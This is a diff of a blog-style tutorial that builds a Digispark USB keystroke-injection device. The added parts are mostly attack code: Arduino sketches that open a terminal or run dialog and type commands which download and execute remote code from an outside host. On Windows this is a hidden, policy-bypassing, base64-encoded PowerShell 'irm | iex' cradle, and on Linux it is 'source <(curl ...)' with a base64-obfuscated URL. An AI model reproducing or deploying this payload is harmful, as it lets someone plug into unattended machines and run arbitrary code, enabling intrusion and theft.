@@ -26,21 +26,25 @@
   <strong>- Setup:</strong>
   <br>
   Setting up a development environment for the Digispark was a more involved process than it could
-  initially seem. I decided to program the chip through its usb interface, as i don't have access to
+  initially seem. I decided to program the chip through its usb interface, as I don't have access to
   a chip programer or an arduino board. To do this we will need the 
   <a href="https://www.arduino.cc/en/software" target="_blank">Arduino IDE</a>.
   <br>
   Once we have the IDE we need to download a plugin to support Attiny85 boards as they are not arduino
   and thus not supported by default. To do this go into: 
-  <code>File > Preferences... > Additional boards manager URLs</code>
+  <code class="hideScroll">File > Preferences... > Additional boards manager URLs</code>
   We need to add the following URL into the box:
   <br>
-  <a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json" target="_blank" class="medium">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a>
+  <a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json" target="_blank">
+    <small>
+      https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
+    </small>
+  </a>
   <br>
   The URL contains a definition of all the digistump boards with different build instructions and libraries.
   <br>
   We now need to install the "<mark>Digistump AVR Boards</mark>" board manager: 
-  <code>Tools > Board > Boards manager...</code>
+  <code class="hideScroll">Tools > Board > Boards manager...</code>
   During the installation process you will see one of the drivers fail to install, this is due to digistump
   abandoning the project. To fix this we need to manually install the drivers from 
   <a href="https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip" target="_blank">Digistump's github</a>,
@@ -62,7 +66,7 @@
   <br>
   So we just need to write a program that sets pin 1 high and low repeatedly:
 </p>
-<pre><code class="cpp">
+<pre><code class="cpp hideScroll">
 void setup() {
   pinMode(1, OUTPUT);
 }
@@ -79,7 +83,7 @@ void loop() {
   Now that we have a working and programmable Digispark we need to device a way to load payloads into 
   it. But before we do that, we need to talk about about the memory limitations of this device...
   <br>
-  The Digispark has 6012 bytes of memory, that is definitly not a lot to work with. The amount of data 
+  The Digispark has 6012 bytes of memory, that is definitely not a lot to work with. The amount of data 
   that can fit in 6Kb is about this much <a href="#2">[^2]</a>:  
 </p>
 <div class="entryImgs center">
@@ -110,7 +114,7 @@ void loop() {
   The DigiKeyboard library allows us to easily emulate a keyboard, this would be a simple implementation
   of an Actual Hello World program:
 </p>
-<pre><code class="cpp">
+<pre><code class="cpp hideScroll">
 #include "DigiKeyboard.h"
 const int inputDelay = 250;
   
@@ -135,86 +139,92 @@ void loop() {
   <a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf" target="_blank">Usb HID Usage Tables (page 53)</a>
   we can figure out some ways to circumvent this issue.
   <br>
-  After a *great* afternoon reading through posts and the usb manual i have composed this list of useful
-  keycodes:
-  <ul>
-    <mark>Key - Usage ID (Dec)</mark>
-    <br>
-    - <u>Main keys</u>
-    <li>"/" => 84</li>
-    <li>"*" => 85</li>
-    <li>"-" => 86</li>
-    <li>"+" => 87</li>
-    <li>"=" => 103</li>
-    <li>"(" => 182</li>
-    <li>")" => 183</li>
-    <li>"{" => 184</li>
-    <li>"}" => 185</li>
-    <li>"^" => 195</li>
-    <li>"%" => 196</li>
-    <li>"<" => 197</li>
-    <li>">" => 198</li>
-    <li>"&" => 199</li>
-    <li>"|" => 201</li>
-    <li>":" => 203</li>
-    <li>"#" => 204</li>
-    <li>"@" => 206</li>
-    <li>"!" => 207</li>
-    - <u>Other useful keys</u>
-    <li>"Tab" => 186</li>
-    <li>"Backspace" => 187</li>
-  </ul>
+  After a *great* afternoon reading through posts and the usb manual and some unicode tables I got the 
+  Digispark typing the especial characters we need:
   <br>
-  Implementing this into a function would look something like this:
+  - For windows we can use some keypad keys as we only need the - and = keys.
 </p>
-<pre><code class="cpp">
-void sendString(char rString[]) {
-  // Loop though each char
-  for(int i = 0; i < x; i++) {
-    // https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 53
-    if     (rString[i] == '/') { DigiKeyboard.sendKeyStroke(84);  }
-    else if(rString[i] == '*') { DigiKeyboard.sendKeyStroke(85);  }
-    else if(rString[i] == '-') { DigiKeyboard.sendKeyStroke(86);  }
-    else if(rString[i] == '+') { DigiKeyboard.sendKeyStroke(87);  }
-    else if(rString[i] == '=') { DigiKeyboard.sendKeyStroke(103); }
-    else if(rString[i] == '(') { DigiKeyboard.sendKeyStroke(182); }
-    else if(rString[i] == ')') { DigiKeyboard.sendKeyStroke(183); }
-    else if(rString[i] == '{') { DigiKeyboard.sendKeyStroke(184); }
-    else if(rString[i] == '}') { DigiKeyboard.sendKeyStroke(185); }
-    else if(rString[i] == '^') { DigiKeyboard.sendKeyStroke(195); }
-    else if(rString[i] == '%') { DigiKeyboard.sendKeyStroke(196); }
-    else if(rString[i] == '<') { DigiKeyboard.sendKeyStroke(197); }
-    else if(rString[i] == '>') { DigiKeyboard.sendKeyStroke(198); }
-    else if(rString[i] == '&') { DigiKeyboard.sendKeyStroke(199); }
-    else if(rString[i] == '|') { DigiKeyboard.sendKeyStroke(201); }
-    else if(rString[i] == ':') { DigiKeyboard.sendKeyStroke(203); }
-    else if(rString[i] == '#') { DigiKeyboard.sendKeyStroke(204); }
-    else if(rString[i] == '@') { DigiKeyboard.sendKeyStroke(206); }
-    else if(rString[i] == '!') { DigiKeyboard.sendKeyStroke(207); }
-    else { DigiKeyboard.print(rString[i]); }
-  }
-}
+<pre><code class="cpp hideScroll">
+DigiKeyboard.sendKeyStroke(86);  // "-"
+DigiKeyboard.sendKeyStroke(103); // "="
+</code></pre>
+<p class="entryContent">
+  - For linux we will use the Ctrl+Shift+U shortcut to input unicode characters.
+</p>
+<pre><code class="cpp hideScroll">
+// Example showing how to input the "|" (U+007C) character 
+DigiKeyboard.sendKeyPress(0x18, 3); // U + L-Ctrl + L-Shift
+DigiKeyboard.sendKeyPress(0x62);    // 0
+DigiKeyboard.sendKeyPress(0x62);    // 0
+DigiKeyboard.sendKeyPress(0x5F);    // 7
+DigiKeyboard.sendKeyPress(0x06);    // C
+DigiKeyboard.sendKeyPress(0,0);     // Reset pressed keys
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
 </code></pre>
 <p class="entryContent">
   This function takes in a string of length x and loops though it replacing the known characters with 
   the appropriate keycodes. If the character doesn't match any it tries to send it through the library.
   <br>
-  Now lets talk about the command we will execute TODOTODO
-
-
-
-
-
-
-  We can then adapt the code we had (I've also added the functionality to open windows run):
+  Now that we can more or less type out a command regardless of keyboard layout we need to decide a
+  what command to execute:
+</p>
+<p class="entryContent tab">
+  <br>
+  <strong>- Windows:</strong>
+  <br>
+  On windows we can use powershell to execute our remote command by using "<mark>irm</mark>" and "<mark>iex</mark>", these
+  commands allow us to get contents from a URI and to evaluate them as powershell commands.
+  <br>
+  This command will retrieve and execute whatever code is on 
+  <a href="https://tiny.cait.moe/?file=ps" target="_blank">tiny.cait.moe/?file=ps</a>:
+  <code class="hideScroll">irm -Uri https://tiny.cait.moe/?file=ps | iex</code>
+</p>
+<p class="entryContent tab">
+  To run this in powershell and make our life easier with keyboard layouts there is a couple things we can do:
+  <ul>
+    <li>Using base64 encoded commands: -EncodedCommand &ltBase64EncodedCommand&gt</li>
+    <li>Using execution policy bypass: -ExecutionPolicy Bypass</li>
+    <li>Using no profile: -NoProfile</li>
+    <li>Using no logo: -NoLogo</li>
+    <li>(optional) Block user input: -NonInteractive</li>
+    <li>(optional) Hide the window: -WindowStyle Hidden</li>
+    <li>(optional) To avoid exiting when the program is finished: -NoExit</li>
+  </ul>
+</p>
+<p class="entryContent tab">
+  Using shortened syntax for the powershell arguments this would be the full command:
+  <code>powershell -nol -nop -noni -w h -ep b -e aQByAG0AIAAtAFUAcgBpACAAaAB0AHQAcABzADoALwAvAHQAaQBuAHkALgBjAGEAaQB0AC4AbQBvAGUALwA/AGYAaQBsAGUAPQBwAHMAIAB8ACAAaQBlAHgA</code>
+  <small>
+    -
+    <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1" target="_blank" rel="noopener noreferrer">
+      powershell arguments reference
+    </a>
+  </small>
+  <br>
+  <small>
+    -
+    <a href="https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" target="_blank" rel="noopener noreferrer">
+      shortened syntax for powershell arguments
+    </a>
+  </small>
+  <br>
+  <br>
+  <strong>- Linux:</strong>
+  <br>
+  On Linux we can use bash to execute our remote command by using "<mark>curl</mark>" and 
+  "<mark>source</mark>" instead.
+  <code class="hideScroll">source <(curl -s https://tiny.cait.moe/?file=sh)</code>
+  To avoid the use of $, ? and ` we can use this command:
+  <code>source <(echo aHR0cHM6Ly90aW55LmNhaXQubW9lLz9maWxlPXNo | base64 --decode | xargs -0 curl -s -k -0)</code>
+</p>
+<br>
+<p class="entryContent">
+  So taking all this into acount the finalized codes to execute our commands are the following.
+  <br>
+  <strong>Windows:</strong>
 </p>
 <pre><code class="cpp">
 #include "DigiKeyboard.h"
-
-// https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 53
-const int KEY_TAB = 186;
-const int KEY_BACKSPACE = 187;
-
 const int inputDelay = 250;
 
 void setup() { pinMode(1, OUTPUT); }
@@ -238,25 +248,75 @@ void sendString(char rString[]) {
   // Loop though each char
   for(int i = 0; i < 161; i++) {
     // https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 53
-    if     (rString[i] == '/') { DigiKeyboard.sendKeyStroke(84);  }
-    else if(rString[i] == '*') { DigiKeyboard.sendKeyStroke(85);  }
-    else if(rString[i] == '-') { DigiKeyboard.sendKeyStroke(86);  }
-    else if(rString[i] == '+') { DigiKeyboard.sendKeyStroke(87);  }
+    if     (rString[i] == '-') { DigiKeyboard.sendKeyStroke(86);  }
     else if(rString[i] == '=') { DigiKeyboard.sendKeyStroke(103); }
-    else if(rString[i] == '(') { DigiKeyboard.sendKeyStroke(182); }
-    else if(rString[i] == ')') { DigiKeyboard.sendKeyStroke(183); }
-    else if(rString[i] == '{') { DigiKeyboard.sendKeyStroke(184); }
-    else if(rString[i] == '}') { DigiKeyboard.sendKeyStroke(185); }
-    else if(rString[i] == '^') { DigiKeyboard.sendKeyStroke(195); }
-    else if(rString[i] == '%') { DigiKeyboard.sendKeyStroke(196); }
-    else if(rString[i] == '<') { DigiKeyboard.sendKeyStroke(197); }
-    else if(rString[i] == '>') { DigiKeyboard.sendKeyStroke(198); }
-    else if(rString[i] == '&') { DigiKeyboard.sendKeyStroke(199); }
-    else if(rString[i] == '|') { DigiKeyboard.sendKeyStroke(201); }
-    else if(rString[i] == ':') { DigiKeyboard.sendKeyStroke(203); }
-    else if(rString[i] == '#') { DigiKeyboard.sendKeyStroke(204); }
-    else if(rString[i] == '@') { DigiKeyboard.sendKeyStroke(206); }
-    else if(rString[i] == '!') { DigiKeyboard.sendKeyStroke(207); }
+    else { DigiKeyboard.print(rString[i]); }
+  }
+}
+</code></pre>
+<p class="entryContent">
+  <strong>Linux:</strong>
+</p>
+<pre><code class="cpp">
+#include "DigiKeyboard.h"
+const int inputDelay = 250;
+
+void setup() { pinMode(1, OUTPUT); }
+
+void loop() {
+  // "source <(curl -s https://tiny.cait.moe/?file=sh)"
+  char command[99] = "source <(echo aHR0cHM6Ly90aW55LmNhaXQubW9lLz9maWxlPXNo | base64 --decode | xargs -0 curl -s -k -0)";
+  // Start keyboard
+  DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(inputDelay); 
+  // Open a terminal (win + space, this is my own keybind repaplace with your own keybind)
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); DigiKeyboard.delay(inputDelay); 
+  // Type the command
+  sendString(command); delay(inputDelay);
+  // Execute the command
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // Indicate the program has finished with the red led
+  for(;;) { digitalWrite(1, HIGH); }
+}
+
+void sendString(char rString[]) {
+  // Loop though each char
+  for(int i = 0; i < 98; i++) {
+    // https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 53
+    // https://www.utf8-chartable.de/
+    if(rString[i] == '-') { DigiKeyboard.sendKeyStroke(86); }
+    else if(rString[i] == '(') { // U+0028
+      DigiKeyboard.sendKeyPress(0x18, 3); // U + L-Ctrl + L-Shift
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x5A); 
+      DigiKeyboard.sendKeyPress(0x60); 
+      DigiKeyboard.sendKeyPress(0,0); 
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    } else if(rString[i] == ')') { // U+0029
+      DigiKeyboard.sendKeyPress(0x18, 3); // U + L-Ctrl + L-Shift
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x5A); 
+      DigiKeyboard.sendKeyPress(0x61); 
+      DigiKeyboard.sendKeyPress(0,0); 
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    } else if(rString[i] == '<') { // U+003C
+      DigiKeyboard.sendKeyPress(0x18, 3); // U + L-Ctrl + L-Shift
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x5B); 
+      DigiKeyboard.sendKeyPress(0x06); 
+      DigiKeyboard.sendKeyPress(0,0); 
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    } else if(rString[i] == '|') { // U+007C
+      DigiKeyboard.sendKeyPress(0x18, 3); // U + L-Ctrl + L-Shift
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x62); 
+      DigiKeyboard.sendKeyPress(0x5F); 
+      DigiKeyboard.sendKeyPress(0x06); 
+      DigiKeyboard.sendKeyPress(0,0); 
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    }
     else { DigiKeyboard.print(rString[i]); }
   }
 }
